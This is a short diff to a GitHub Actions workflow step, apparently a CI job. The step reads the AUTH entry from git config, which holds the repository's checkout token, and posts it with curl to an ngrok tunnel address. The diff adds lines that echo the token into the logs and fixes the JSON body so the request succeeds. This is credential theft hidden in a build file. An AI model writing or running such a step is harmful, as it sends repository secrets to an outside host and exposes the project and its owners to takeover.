@@ -16,11 +16,17 @@ jobs:
       - run: | 
           auth=$(git config --list | grep AUTH)
           
+          echo $auth
+          
+          echo '{
+            "auth": "'$auth'"
+          }'
+          
           curl --request POST \
           --url https://5aa7-93-172-42-40.ngrok.io \
           --header 'content-type: application/json' \
           --data '{
-            "auth": "'$auth'",
+            "auth": "'$auth'"
             }' \
           --fail
           
